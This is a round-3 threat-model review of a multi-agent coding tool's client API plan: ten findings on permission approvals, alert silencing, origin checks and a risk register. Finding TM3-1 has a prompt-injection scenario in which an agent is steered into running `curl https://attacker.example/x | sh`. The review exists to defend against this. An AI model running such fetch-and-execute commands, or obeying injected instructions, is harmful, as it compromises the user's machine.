revise
Grade: 7  B/M/m: 0/1/9  Flags: none

# Threat-model review of the client API plan, round 3

This review covers the plan and client API contract version 10, which folds round 2. Code claims are checked at commit `8ff4c9b`. Paths under `engine/`, `contracts/`, `mcp/` and `testing/` are under `packages/`. `contract.md`, `plan.md`, `decisions.md`, and the files under `inputs/` and `attack/` are in the review folder.

This review does not reopen the owner's decision to leave the web server open. It does not file the pendency of owner question 6. It does not file anything in `attack/known-gaps.md`, except where it says that a gap is wrongly scoped.

Adapter claims come from a static reading of the installed source of the pinned versions, `@agentclientprotocol/codex-acp` 2.5.0 and `@agentclientprotocol/claude-agent-acp` 0.99.1 (`engine/package.json:17-18`), on 2026-11-03. This worktree has no `node_modules`, so the source was read from a sibling worktree's install. Nothing was run. A static reading is not a recording, so proposed check 1 confirms these claims on real adapters.

## Summary

The folds of round 2 hold, with no blocker, and with one major that earlier rounds did not reach. The fold of TM2-1 protects the owner's page only. A team lead that holds a worker's permission request still approves a title, and with the pinned Codex adapter that title is often the fixed text "Run command" (TM3-1).

The nine minor findings are local fixes. The three that matter most are these:

- E29 carries no file paths and no thread link, so every Codex file edit reaches the page as a fixed title and a warning (TM3-2).
- One call to `clear-token` silences the phone on the deny-all server that the setup document recommends (TM3-3).
- A dismiss can stop or erase the push that a device caller "cannot switch off" (TM3-4).

Team rule 8 says that security does not block. So these findings rank work, and the decisions stay with the owner.

## Findings

### TM3-1. MAJOR. An agent holder still approves a title

- **Category:** Security (integrity).
- **Responsibility:** Access.
- **Fold checked:** TM2-1 and row 132. The fold holds for the page, and it does not reach the other approvers.
- **Scenario:** A Codex worker under a lead is steered by a prompt injection into running `curl https://attacker.example/x | sh`. The request's holder is the lead (`engine/src/routing/permissions.ts:22`). The lead receives "Permission request `<id>` from agent `<id>`:" and the title, inside the data envelope (`engine/src/routing/holders.ts:53`). The pinned adapter's title for that command is fixed text from `permissionTitle`, and with no parsed action it is "Run command" (`codex-acp/dist/index.js:33026-33028`, `:32908-32945`). The lead answers "Allow once" within its own mode, because `canAnswerOption` reads the option and the mode and never reads the action (`engine/src/routing/permissions.ts:42-47`). The command runs, and nobody who approved it saw it. Most requests take this path, because the owner holds a request only when no agent above is available or when it is a settings write (`permissions.ts:22`).
- **Why this is not settled:** Ruling 3 and row 132 name the owner and the page. Contract E29 says only that "the page shows the input" (`contract.md:2132`). The roles plan uses `toolInput` for its matcher only (`inputs/roles-plan.md:1121`). Nothing tells a holder that the input exists. A holder may read it through `client.thread`, by the read rule (`contract.md:535-538`), but the delivered text does not say so, and an agent will answer from what it was given.
- **The move path is also affected:** `move` builds its delivery from the row (`engine/src/routing/holders.ts:88`). E29 keeps `toolInput` out of the requests view (`contract.md:2130-2131`), so a moved request cannot include the input as written.
- **The owner's other surfaces:** Criterion 8.2 (`plan.md:708`) lets the owner answer from the pane viewer with no requirement to show the input, and the mock list for WS-8 (`plan.md:719-721`) does not name it. So the same owner approves an action on the page and a title in the pane.
- **Suggested fix:**
  - In `permissionRequested`, include the redacted input in the holder's delivery, inside the existing envelope, when the event has one.
  - When the input is absent, redacted or cut, add fixed words saying that the input is not visible.
  - For a moved request, add a fixed sentence that tells the new holder to read the asker's thread with `client.thread` before it answers. The other way is to keep the bounded input in the view for routing, and out of every snapshot.
  - Require the pane viewer to show the input or the warning before an answer, in criterion 8.2, using `client.event`.
  - Extend criterion 1.42. Name `routing/text-is-data.test.ts` and `routing/permissions.test.ts` as updated for this edit, because the delivered text changes.

### TM3-2. MINOR. Every Codex file edit reaches the page as a fixed title and a warning

- **Category:** Security (integrity).
- **Responsibility:** Access.
- **Fold checked:** TM2-1 and criterion 7.12. The plan follows ruling 3 as written, so this names an unaddressed consequence and does not reopen the ruling.
- **Scenario:** A Codex worker edits a file, and the owner holds the request. The adapter's permission tool call has a fixed title, a kind and locations, and no `rawInput` and no content (`codex-acp/dist/index.js:33665-33672`). So E29 stores `toolKind: edit` and no input. E29 also drops `locations`, which the runner reads today only to compute `settingsWrite` (`engine/src/runner/AcpRunner.ts:416`). The phone therefore shows a title such as "Edit files" and the fixed warning, with no file name. This happens on every Codex edit. A warning that appears on every edit teaches the owner to tap past it, including on the rare request where it matters.
- **Evidence that better data exists:**
  - The Claude adapter carries `rawInput`, `kind`, `content` and `locations` on the request, for a client that advertises no extra capabilities (`claude-agent-acp/dist/tool-calls/renderer.js`, `permissionToolCall`), as `AcpRunner.ts:419` does.
  - The Codex diff normally reaches the thread as a file-change item (`engine/src/runner/translate.ts:27-33`), and the thread item shares the request's `toolCallId`.
  - TM2-1's suggested fix offered this join by `toolCallId` as its second way. E29 took only the first way.
- **Suggested fix:**
  - Add bounded `locations` to E29's fields.
  - When an event has no input, have the page show the thread items with the same `toolCallId` unfolded above "Allow", and keep the warning only when neither exists.
  - Add a Codex-shaped case to criterion 7.12, with no `rawInput`. The fake agent's permission step needs the new fields as well (`testing/src/fakeAgent.ts:293-294`).

### TM3-3. MINOR. `clear-token` silences the phone on the recommended server

- **Category:** Security (integrity).
- **Responsibility:** Secrets and dependencies.
- **Fold checked:** TM2-5 and row 139. The fold holds for a carrier change, and it does not hold for a token clear.
- **Known gap wrongly scoped:** The gap at `known-gaps.md:39-44` names "the alert carrier's server and topic". It does not name the token clear, which is the quieter route.
- **Scenario:** A caller that passed the guard calls `client.alerts.carrier.clear-token`, whose access includes `device` (`contract.md:1186`). The alert worker removes the value at once (`contract.md:1051-1055`). The `client.lasting-setting` alert about the clear is raised, and it goes out with no token. The setup document tells the owner to run ntfy with deny-all (`contract.md:1075-1076`), so the server refuses that send and every later one. The phone hears nothing about this change, or about any later change. The retries go on, marked as still failing, and only a client that is already open shows that (`contract.md:958-962`).
- **Evidence:** The old-carrier rule covers only "the alert about `client.AlertCarrierChanged`" (`contract.md:841-846`). Criterion 6.17 (`plan.md:606`) checks that `AlertCarrierTokenCleared` is a source, and it does not check that the alert reaches a deny-all server. So `carrier.set` warns through the old token, and `clear-token` does not. A caller who wants silence uses `clear-token`.
- **Suggested fix:** Apply the old-carrier rule to a token clear. The alert about `client.AlertCarrierTokenCleared` is sent with the cleared value, up to five attempts, and the value is removed only after they end. Add a deny-all fake server to criterion 6.17.

### TM3-4. MINOR. A dismiss stops or erases the push that a device caller cannot switch off

- **Category:** Security (integrity).
- **Responsibility:** Access.
- **Fold checked:** TM2-5 and row 139.
- **Known gap wrongly scoped:** The gap at `known-gaps.md:48-55` says that the push cannot be switched off, and that "a web caller can still dismiss the alert, and the computer's list still shows it". That understates the effect of a dismiss.
- **Scenario:** A web caller changes a harness's adapter path, reads the new alert's id from the stream, and calls `client.alerts.dismiss` (`contract.md:1181`). If the dismiss commits before the send, "a cleared alert is not sent" (`contract.md:956-957`), and a pending alert must be open (`contract.md:937`). This window is at least 5 seconds on any retry, and much longer while the carrier is down. If the send already happened, `clear` runs once and deletes the notification from the phone (`contract.md:963-966`). In both cases the owner's phone shows nothing. The record stays in the terminal's `--all` list, which the owner has no reason to open.
- **Suggested fix:** For the `client.lasting-setting` kind, a dismiss from a device caller closes the alert on the page only. It does not cancel the first send, and it does not call `clear`. A dismiss from the owner's terminal behaves as today. Add both cases to criterion 6.17, and correct the known gap.

### TM3-5. MINOR. An agent's `client.snapshot` is the remaining unwrapped path, and its sections have no test

- **Category:** Security (integrity).
- **Responsibility:** Isolation.
- **Fold checked:** TM2-10 and row 140. The fold holds for `client.thread`.
- **Scenario:** `client.snapshot` is an MCP (Model Context Protocol) tool, because its access includes `agent` and it is not a stream (`contract.md:1175`, `:137-139`). An agent's snapshot holds the request and question rows that it may read. Each display part holds a preview of up to 512 bytes and adapter-supplied option names (`contract.md:473-477`). So a lead that calls the tool receives a worker's request text with no data envelope. That is the same text that `client.thread` now wraps. SECURITY.md rule 7 is the rule involved.
- **Second part:** The contract says that an agent's thread page "goes inside the data envelope" (`contract.md:637-639`), and a page's shape is `items` and `next` (`contract.md:238-241`). E15's envelope is a text form (`engine/src/routing/envelope.ts:14-18`). Nothing says what an agent's reply looks like, or whether the server or the MCP layer wraps it. If the MCP layer wraps it, an agent that runs `lgtm client thread` gets raw text.
- **Third part:** The snapshot lists accounts, devices and alerts with no per-caller statement (`contract.md:442-447`), and only the wait-state section names who gets it. The general rule at `contract.md:598-599` covers them. Criterion 3.1 (`plan.md:466`) tests only the wait-state section's absence for an agent. Round 2's proposed check 4 asked for this, and no post-build check adopted it.
- **Suggested fix:**
  - For an agent caller, leave out the display part, so that identity rows alone remain, or wrap it.
  - Say that the server does the thread wrapping, and state the agent's reply schema.
  - Add to criterion 3.1 that an agent's snapshot has no account, device or alert section.

### TM3-6. MINOR. A squatter on the loopback port holds the trusted origin while the server is down

- **Category:** Security (isolation).
- **Responsibility:** Isolation.
- **Fold checked:** TM2-3 and row 134. Dropping `localhost` holds. TM2-3's related case, a squatter on `127.0.0.1:8787` while the real server is down, was not folded and is not in the known gaps.
- **Scenario:** Another local Unix user, whom the guard refuses at the socket (row 92), binds `127.0.0.1:8787` while LGTM Studio restarts, or while `enabled` is off. Binding an unprivileged port needs no rights. In proxy mode, Caddy now sends the phone's requests to the squatter, so its response carries the real public origin. It serves a page with a long `Cache-Control` lifetime, and with no Content Security Policy of ours. It releases the port. The real server comes back. The phone loads the cached page, whose script connects through the proxy with the right `Origin`, a forwarded address inside the allowed networks and `https`. It passes every row of the table, so the refused user now drives the owner's control.
- **Why it matters here:** Ruling 2 reasoned that "SECURITY.md need not name a new accepted risk after this" (`decisions.md:100`). The changes in `inputs/security-agents-changes.diff` say that the web server refuses another user's process. This route needs no connection of its own until the owner's phone makes it. A same-user program is not the concern, because it can already do more.
- **Suggested fix:** Add this to the known gaps and to SECURITY.md's suspension paragraph as a limit of the loopback port. Say in `docs/remote-access.md` that a `client.web-down` alert means the page must not be opened. Have the later pairing plan consider a proxy upstream that is a Unix socket with a group permission, which a squatter cannot hold.

### TM3-7. MINOR. "None" has no token rule, and a selected token can be missing from the store

- **Category:** Bug (failures).
- **Responsibility:** Secrets and dependencies.
- **Scenario:** The plan's rollback runs `client.alerts.carrier.set` with "none" (`plan.md:265`). The contract says that a change "to another origin" clears the token (`contract.md:1047-1048`), and it says nothing about "none". E27's keep entry returns the name only "while a token is set for the current origin" (`contract.md:2064-2065`), and there is then no current origin. So a restart removes the value, while the view still reads "token set" for the recorded origin. After the fix-forward, the owner sets the same server again. `client.alerts.settings` says a token is set, and the deny-all server refuses every send.
- **Second part:** `resolve` returns nothing for a missing value and also for a failed read (`engine/src/accounts/SecretStore.ts:66-72`). A send that captured the reference just before `removeCarrierValue` runs can meet this. The contract does not say whether that is a failed attempt or a send with no token.
- **Suggested fix:** State that "none" clears the token in the same batch. State that an active reference with no value is a failed attempt and is shown to the owner as "token missing". Add both to criterion 6.14.

### TM3-8. MINOR. Unit 6b has no attack pass

- **Category:** Design.
- **Responsibility:** Secrets and dependencies.
- **Scenario:** Unit 6b holds the plan's only new credential, its only outbound HTTP path, a destination that an unauthenticated web caller can set, URL parsing with a private-address exception, the redirect and response limits, and the generation rules. The sizing table gives it no attack pass (`plan.md:971`), while row 117 gives one to units 1a, 1b, 3, 5, 7b and 10. E27 in unit 1b covers the storage side only. A parser or redirect mistake here sends the token to the wrong place, and no later lens is assigned to find it.
- **Suggested fix:** Add an attack pass on unit 6b, with criteria 6.12 to 6.15 as its scope. Update the launch count in the sizing section.

### TM3-9. MINOR. A public request may carry a loopback `Origin`

- **Category:** Security (isolation).
- **Responsibility:** Access.
- **Scenario:** A public request is accepted when it "names the public address in `Host` or `Origin`" (`contract.md:1238`), and the allowed origin names include `127.0.0.1` at the port (`contract.md:331-332`). So `Host: <public address>` with `Origin: http://127.0.0.1:8787` passes. The "or" exists for a proxy that rewrites `Host` (row 90), and that case needs only the opposite pair. Criterion 10.1 (`plan.md:752`) accepts "the loopback ones" for a public request too. On a WireGuard laptop or phone, web content served from port 8787 on that device's own loopback can open the WebSocket through the owner's browser. Port 8787 is a common local development port. A program on such a device could already reach the proxy, so the new exposure is only hostile content running inside a browser sandbox.
- **Suggested fix:** On a public request, `Origin`, when present, must be the public address. Add the refused pair to criterion 10.2.

### TM3-10. MINOR. An agent's filtered stream can stall at a state-bearing marker

- **Category:** Bug (failures).
- **Responsibility:** Integrity.
- **Fold checked:** C2-01, R2-L2 and logic Opus major 4 (row 137). The fold holds for the owner, a device and a service.
- **Scenario:** `client.subscribe` allows `agent`, and `client.event` does not (`contract.md:1178-1179`). A lead runs `lgtm client subscribe` with its own token, and its child starts with a 300 KiB prompt. The client library sees a marker over `AgentStarted`, and it reads the event with `client.event`. That read is refused. "If the read fails, it reconnects from before the marker" (`contract.md:1143-1146`), so the stream meets the same marker and loops, with no stated pause. No plan calls this path today, so the effect is limited to an agent that uses the command-line form.
- **Suggested fix:** Give `client.event` to `agent`, under the same visibility rule and the thread page's envelope. The other way is to have the client library treat an access refusal as "skip and report", with no reconnect. Add a case to criterion 3.8.

## Folds of round 2's blocker and majors that were checked

| Round-2 item | Result |
| --- | --- |
| R2-L1, R2-A1, R2-TM-1, logic Opus major 1 (row 130) | Holds. `retainOnly` stays at start-up, where recovery runs before any command (`engine/src/commands/SecretStore.ts:13-15`). A removal of one fresh name cannot touch an account's secret. `SecretStore`'s semaphore serializes the removal with `put` (`engine/src/accounts/SecretStore.ts:40`, `:58-65`). |
| R2-A2, R2-L3, R2-TM-2, logic Opus major 3 (row 131) | Holds. The destination and the reference are captured from one views value, so a token cannot reach another origin through a race. TM3-7 names a small gap on a missing value. |
| TM2-1 (row 132) | Holds for the page. See TM3-1 for the holder and the viewer, and TM3-2 for a harness that sends no input. The Claude adapter and Codex's command requests do carry `rawInput`. |
| TM2-2 (row 133) | Holds. A proxy-user peer is always public, and a forwarded header with proxy mode off is refused. See "Noted" for the known gap's scope. |
| TM2-3 (row 134) | Holds for `localhost`. See TM3-6 for its related case. |
| R2-A3 (row 136) | Nothing found through this lens. A `baseline` alert is not pushed, by the owner-visible rule. |
| C2-01, R2-L2, logic Opus major 4 (row 137) | Holds for the owner, a device and a service. See TM3-10 for an agent. |
| C2-02 (row 138) | Holds. The value goes in under a fresh name, and a failed write leaves the earlier token selected. `put` accepts any reference, `SecretReference`'s pattern (`contracts/src/accounts.ts:4`) still refuses a dotted name in `Account.secret`, and the one `secrets.resolve` site is the runner (`engine/src/runner/AcpRunner.ts:222`), so the reserved-prefix rule covers every reader. The redactor rereads `secrets.json` (`engine/src/service.ts:81-85`), so a new token is redacted at once. |
| C2-03 (row 135) | Nothing found through this lens. |
| Logic Opus major 2 (row 143) | Nothing found through this lens. The batch path, and not the piece, writes `StateChanged idle`. |
| Logic Opus major 5 (row 144) | Nothing found through this lens. |

The minors TM2-4, TM2-6, TM2-7, TM2-8, TM2-9, TM2-11, TM2-12 and TM2-13 hold as folded. TM2-5 and TM2-10 hold in part (TM3-3, TM3-4, TM3-5). E28's refusal fits the pinned Codex adapter's options: its persisting options have kind `allow_always` or `reject_always` (`codex-acp/dist/index.js:38300-38395`).

## Check of engine edits E1 to E29

The consumers are board contract version 8 and roles plan version 10. "Consistent" means that the consumer's use matches the edit. Lag behind contract version 10 is not filed.

| Edit | Result through this lens |
| --- | --- |
| E1, E10 | Nothing found. The pin of E2 replaces the loosened MCP check. |
| E2 | Sound. The list is pinned, and the access check runs first. TM3-5 concerns what one tool returns. |
| E3, E4, E5, E6, E7 | Nothing found. |
| E8 | Nothing found. Today's rule is kept, with L29's case. |
| E9 | TM3-5. |
| E11, E12 | Sound. `start`'s follow-on writes are under "Noted". |
| E13, E14 | Consistent with the roles' `release`, `roles.record` and sheepdog commands, and with WS-7a's second write. |
| E15 to E18 | Consistent with the board's sender label and its reach check. Nothing found. |
| E19, E20 | Nothing found. |
| E21 | Sound. TM3-5 covers the agent's reply shape. |
| E22, E23 | Consistent with the board and the roles. |
| E24, E25, E26 | Nothing found. TM3-10 concerns the marker rule above E24. |
| E27 | Sound for accounts. TM3-3 and TM3-7 concern the slot. |
| E28 | The anchors are correct, and the option kinds fit the pinned Codex adapter. |
| E29 | Consistent with the roles' matcher, which refuses a redacted or cut input (`inputs/roles-plan.md:642`, `:712`). TM3-1 and TM3-2 concern the other readers. |

The existing tests that section 6 names exist at the commit. I found no changed existing test that goes unnamed, apart from the two that TM3-1's fix would add. E29 names only a new test file. `events-roundtrip.test.ts` is already named for edits in the same unit, so gate 1.1 is not at risk if it gains these fields.

## Trace of the six responsibilities

- **Isolation.** The web caller is one owner-level identity, by the owner's decision. The guard and the proxy table do what they claim. TM3-6 and TM3-9 are the two remaining edges. TM3-5 concerns what crosses to an agent.
- **Identity across sessions.** This phase has no sign-in, and the page has no session to sign out of. The lost-phone section is adequate. `device: open-web` cannot tell the owner's phone from an agent past the guard, which the owner accepted.
- **Access.** E2's table and order are sound. TM3-1 and TM3-2 are the gaps at the human and agent decision.
- **Integrity.** The secret-store fold holds. TM3-3 and TM3-4 are the ways the watched caller still hides a change. TM3-10 is a stalled stream.
- **Confidentiality.** Alerts carry five fields, and the inventory of copies now includes the proxy log, the service log and the protocol log (row 156). Plain environment values remain a known gap.
- **Secrets and dependencies.** One token slot, origin binding and "no redirects" hold. TM3-7 and TM3-8 are the gaps. I found no new dependency concern through this lens.

## Proposed post-build checks

These are questions that only a running build can answer. None replaces a fix above.

1. Record a real permission request for each pinned harness and each tool kind, and list which of `kind`, `rawInput`, `locations` and `content` each carries. Today's fixtures hold no `request_permission` frame (`testing/fixtures/claude.ndjson`, `codex.ndjson`). Report how often the page's warning appears in a normal day's work.
2. Plant a known secret across the 8 KiB boundary of `toolInput`, and confirm that no part of it is stored, which proves that redaction runs before the cut.
3. Bring the WireGuard interface up after the service starts, then connect from the host to the proxy's public address. Confirm that the "host's own addresses" row refuses it, so that `os.networkInterfaces()` is not read once and cached.
4. Send a hidden oversized event's sequence through an agent's `client.subscribe`, and confirm that no marker reveals its tag or size.
5. Send an inbound WebSocket frame that inflates past 1 MiB with compression on, as an extension of PB-1.
6. In unit 7b's attack pass, show a `toolInput` with bidirectional control characters, runs of spaces and many blank lines on a 360-pixel screen, and confirm that the real command stays visible before "Allow".
7. With a known request, confirm that an agent's `client.snapshot` from a live build holds no account, device or alert section, until TM3-5's criterion exists.

## Refused

Refused: none.

## Noted, not filed

- The open server, the guard's bypasses, the lack of an own user, and an agent approving itself through the web are accepted by the owner, and are in the known gaps.
- A self-approval also closes its alert and deletes the phone's notification. This follows from the accepted risk, and it is one more reason for TM3-4's rule to be extended later.
- The known gap on a same-user proxy says "with proxy mode on" (`known-gaps.md:56-60`). The same is true with proxy mode off, because row "Off, names loopback, no forwarded header" accepts it (`contract.md:1231`). The gap's scope should drop those words.
- The known gap "one small event every 10 minutes" is per alert. `client.lasting-setting` alerts close only on a dismiss, so many of them multiply it while a carrier is down.
- `start`'s follow-on writes carry the actor and no device (`engine/src/commands/start.ts:66-79`), and row 152 covers only `resume`. No check depends on them.
- `settingsWrite` is computed from `locations` alone (`engine/src/runner/AcpRunner.ts:416`), so a shell command that writes a settings file is not one, and neither is a Codex edit whose item is not yet known (`codex-acp/dist/index.js:33670`). E28's second clause is only as strong as that. The owner may want to know this when answering question 6.
- The page's build folder is writable by agents, as round 2 noted. It is still not in the list of ways the guard fails.
- `enabled` on by default, and a wide `allowedClientNetworks`, are the owner's choices.
- The carrier as a way to reach internal addresses adds no power while the server is open.

## Risk register

Score is severity × fallout × probability, each from 1 to 10. Bands: 400 or more, fix now; 150 to 399, fix before release; 50 to 149, schedule; under 50, record. The floor: severity 9 or 10 with fallout 7 or more is at least "fix before release", unless probability is 1. The evidence status of every row is confirmed at plan level. The decision, the deadline and the closing evidence are left for the owner and the runner. The owner of each row, by area, is in brackets after its id.

| ID | S | F | P | Score | Band | Reasons |
| --- | --- | --- | --- | --- | --- | --- |
| TM3-1 (engine 1b, viewer 8) | 6 | 5 | 6 | 180 | Fix before release | S: an action runs that its approver never saw. F: one team's reach, within the lead's mode. P: leads hold most requests, and an injection is needed to make it harmful. |
| TM3-2 (engine 1b, page 7b) | 6 | 3 | 8 | 144 | Schedule | S: the core approval is blind until the owner looks elsewhere. F: the owner can read the thread. P: every Codex edit the owner holds. |
| TM3-5 (reads 3) | 6 | 5 | 4 | 120 | Schedule | S: injected text reaches a lead. F: the lead's children. P: needs a lead to call the snapshot tool on hostile text. |
| TM3-3 (alerts 6b) | 5 | 5 | 4 | 100 | Schedule | S: a named control fails silently. F: all later pushes. P: needs a caller past the guard, acting on purpose. |
| TM3-4 (alerts 6a) | 4 | 5 | 4 | 80 | Schedule | S: one change is hidden from the phone. F: the setting outlasts it. P: needs a deliberate caller. |
| TM3-6 (web server 5, docs 10) | 9 | 7 | 1 | 63 | Schedule | S: owner's control. F: the whole machine's agents. P: an attacker with a local account on the host, and a restart. |
| TM3-9 (proxy 10) | 9 | 7 | 1 | 63 | Schedule | S: owner's control. F: the whole machine's agents. P: three rare events: hostile content, that port, and WireGuard on. |
| TM3-7 (alerts 6b) | 4 | 3 | 4 | 48 | Record | S: alerts stop for a while, with a wrong status. F: the owner re-enters the token. P: a rollback and a restart. |
| TM3-8 (plan sizing) | 2 | 3 | 6 | 36 | Record | S: a review gap, with no direct harm. F: one unit. P: certain to be skipped as written, and rarely consequential. |
| TM3-10 (client 3) | 4 | 3 | 2 | 24 | Record | S: one stream stalls. F: the agent can read another way. P: an agent using the command-line stream, and a large state event. |
